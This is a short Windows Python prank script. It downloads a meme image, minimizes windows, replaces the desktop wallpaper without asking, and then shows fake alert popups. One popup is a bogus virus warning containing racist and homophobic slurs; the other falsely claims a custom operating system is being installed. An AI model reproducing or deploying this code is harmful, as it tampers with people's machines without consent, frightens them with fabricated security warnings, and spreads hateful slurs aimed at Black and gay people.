import ctypes
import os
import win32gui
import win32con
import requests
from tkinter import Tk, messagebox

def minimize_all_windows():
    """Minimizes all open windows."""
    hwnd = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)

    # Simulates the Windows Show Desktop command
    ctypes.windll.user32.ShowWindow(ctypes.windll.user32.GetShellWindow(), win32con.SW_MINIMIZE)

def set_wallpaper(image_path):
    """Sets the desktop wallpaper."""
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)

def download_image(url, save_path):
    """Downloads an image from the specified URL to the given path."""
    try:
        response = requests.get(url, stream=True)
        if response.status_code == 200:
            with open(save_path, 'wb') as file:
                for chunk in response.iter_content(1024):
                    file.write(chunk)
            return True
        else:
            print(f"Failed to download image. Status code: {response.status_code}")
            return False
    except Exception as e:
        print(f"Error occurred while downloading image: {e}")
        return False

def show_warning_message():
    """Displays a warning message box."""
    root = Tk()
    root.withdraw()  # Hides the root window
    messagebox.showwarning("TV Control", "YOU JUST GOT THE GAY NIGGA VIRUS CLOSE THIS POPUP TO DELETE VIRUS")
    messagebox.showerror("DickOS", "We are now installing our custom os in your windows.")

if __name__ == "__main__":
    # URL of the image to download
    image_url = "https://wallpapers.com/images/featured/dank-meme-u960ajl32oa6eb4o.jpg"
    # Path to save the downloaded image
    wallpaper_path = os.path.join(os.getenv('TEMP'), 'downloaded_wallpaper.jpg')

    if download_image(image_url, wallpaper_path):
        minimize_all_windows()
        set_wallpaper(wallpaper_path)
        show_warning_message()
    else:
        print("Failed to set wallpaper due to download error.")
